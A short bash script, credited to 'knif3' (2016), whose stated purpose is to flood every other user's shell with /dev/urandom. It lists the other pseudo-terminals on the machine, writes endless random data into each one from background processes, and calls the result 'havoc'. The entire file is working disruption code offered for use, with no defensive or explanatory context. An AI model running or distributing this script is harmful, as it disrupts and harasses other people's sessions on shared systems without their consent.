#!/bin/bash
## knif3 - 2016
## Floods all other shells with /dev/urandom
list=($(who | grep pts |  awk {'print $2'} | grep -x -v "$(ps | awk {'print $2'} | tail -n1)" | cut -d'/' -f2))
pids=()
for var in "${list[@]}"
do
  cat /dev/urandom >> /dev/pts/$var &
  pids+=( $! )
done

read -p "Enter \"k\" to stop. Press \"CTRL+c\" to continue the havoc. (\"killall cat\" to kill it later): " x
for piss in "${pids[@]}"
do
  kill $piss
done
